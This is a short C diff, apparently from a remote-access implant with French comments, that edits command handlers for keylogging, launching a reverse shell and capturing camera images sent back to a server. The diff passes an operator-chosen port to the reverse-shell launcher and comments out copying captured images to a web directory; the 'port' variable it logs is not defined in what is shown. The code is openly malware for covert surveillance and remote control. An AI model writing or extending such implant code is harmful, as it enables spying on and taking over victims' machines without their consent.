@@ -231,12 +231,16 @@ int klg_handler(char *args) {
     return ret_code;
 }
 
-int shellon_handler(char *args) {
-    DBG_MSG("shellon_handler: shellon received, launching reverse shell\n");
-    int ret_code = launch_reverse_shell();
-    if (ret_code < 0) {
-        ERR_MSG("shellon_handler: failed to launch reverse shell\n");
-    }
+int shellon_handler(char *args)
+{
+    DBG_MSG("shellon_handler: shellon received, launching reverse shell on port %d\n", port);
+
+    // Lancer le reverse shell avec le port spécifié
+    int ret_code = launch_reverse_shell(args);
+
+    if (ret_code < 0)
+        ERR_MSG("shellon_handler: failed to launch reverse shell on port %d\n", port);
+
     return ret_code;
 }
 
@@ -350,6 +354,7 @@ int capture_image_handler(char *args)
     // Envoyer l'image capturée au serveur
     send_to_server("Captured image saved at /tmp/capture.jpg\n");
 
+    /*
     // Copiez l'image dans un répertoire accessible à Flask
     // Par exemple, dans /var/www/html/images/ sur le serveur
     int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
@@ -357,7 +362,7 @@ int capture_image_handler(char *args)
         ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
         return copy_ret_code;
     }
-
+    */
     return SUCCESS;
 }
 
